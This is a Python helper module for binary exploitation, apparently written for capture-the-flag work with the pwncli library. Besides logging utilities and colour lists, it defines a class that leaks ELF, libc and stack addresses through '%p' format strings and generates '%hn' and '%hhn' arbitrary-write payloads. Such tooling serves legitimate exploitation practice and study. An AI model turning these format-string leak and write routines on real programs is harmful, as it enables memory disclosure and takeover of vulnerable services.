from pwncli import *

lg_inf = lambda s: print("\033[1m\033[33m[*] %s\033[0m" % (s))
lg_err = lambda s: print("\033[1m\033[31m[x] %s\033[0m" % (s))
lg_suc = lambda s: print("\033[1m\033[32m[+] %s\033[0m" % (s))
i2b = lambda c: str(c).encode()
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")

monokai_colors = ["#ff6188", "#fc9867", "#ffd866", "#a9dc76", "#78dce8", "#a698ea"]
gruvbox_colors = [
    "#928374",
    "#fb4934",
    "#b8bb26",
    "#fabd2f",
    "#83a598",
    "#d3869b",
    "#8ec07c",
    "fe8019",
]


def lg_dict(data):
    for key, value in data.items():
        lg(key, value)


def debugPID(io):
    try:
        lg("io.pid", io.pid)
        input()
    except Exception as e:
        lg_err(e)
        pass


# strfmt
class strFmt:
    def __init__(self):
        self.current_n = 0

    def leak_by_fmt(
        self,
        count,
        elf_idx=-1,
        libc_idx=-1,
        stack_idx=-1,
        separater=b".",
        new_line=True,
        identify=b"^",
    ):
        payload = identify + (b"%p" + separater) * count
        if new_line:
            payload += b"\n"
        s(payload)
        ru(identify)
        res = {}
        for i in range(count):
            temp_res = ru(separater, drop=True)
            if b"nil" in temp_res:
                continue
            temp_res = int(temp_res, 16)
            lg("temp_res", temp_res)
            if i == elf_idx:
                res["elf"] = temp_res
                lg("addr_in_elf", temp_res)
            elif i == libc_idx:
                res["libc"] = temp_res
                lg("addr_in_libc", temp_res)
            elif i == stack_idx:
                res["stack"] = temp_res
                lg("addr_in_stack", temp_res)
        return res

    def generate_hn_payload(self, distance, hn_data):
        hn_data = hn_data & 0xFFFF
        offset = (distance // 8) + 6
        if hn_data > self.current_n:
            temp = hn_data - self.current_n
        elif hn_data < self.current_n:
            temp = 0x10000 - self.current_n + hn_data
        elif hn_data == self.current_n:
            return b"%" + i2b(offset) + b"$hn"
        self.current_n = hn_data
        return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hn"

    def generate_hhn_payload(self, distance, hhn_data):
        hhn_data = hhn_data & 0xFF
        offset = (distance // 8) + 6
        if hhn_data > self.current_n:
            temp = hhn_data - self.current_n
        elif hhn_data < self.current_n:
            temp = 0x100 - self.current_n + hhn_data
        elif hhn_data == self.current_n:
            return b"%" + i2b(offset) + b"$hhn"
        self.current_n = hhn_data
        return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"
